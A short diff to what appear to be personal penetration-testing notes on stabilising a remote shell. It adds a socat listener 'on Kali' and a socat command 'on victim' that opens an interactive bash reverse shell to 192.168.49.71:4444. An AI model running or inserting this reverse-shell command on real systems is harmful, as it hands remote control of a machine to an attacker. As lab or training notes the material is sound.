@@ -11,6 +11,11 @@ stty raw -echo ; fg ; reset
 stty columns 200 rows 200
 stty columns 150 rows 150
 
+// Pimp out linux shell
+which socat
+socat file:`tty`,raw,echo=0 tcp-listen:4444 #On Kali Machine
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.49.71:4444 #On Victim Machine
+
 (stty size)
  
 * Don't forget that you can always set the terminal history to be infinite, and the keystroke scroll back. 
